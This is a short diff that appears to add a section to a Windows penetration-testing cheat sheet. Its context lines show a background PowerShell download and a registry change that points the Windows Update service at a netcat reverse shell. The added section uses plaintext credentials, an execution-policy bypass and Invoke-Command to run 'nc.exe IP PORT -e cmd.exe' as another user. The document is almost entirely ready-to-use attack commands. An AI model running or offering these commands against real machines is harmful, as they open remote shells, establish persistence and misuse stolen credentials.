@@ -105,3 +105,11 @@ START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://e
 ```
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\services\wuauserv" -Name ImagePath -Value "C:\path\to\nc.exe IP PORT -e cmd"
 ```
+### [executing program as a different username in powershell]
+```
+powershell -nop -exec bypass
+$username = "<WORKSTATION\username>"
+$password =  ConvertTo-SecureString "<password>" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
+Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
+```
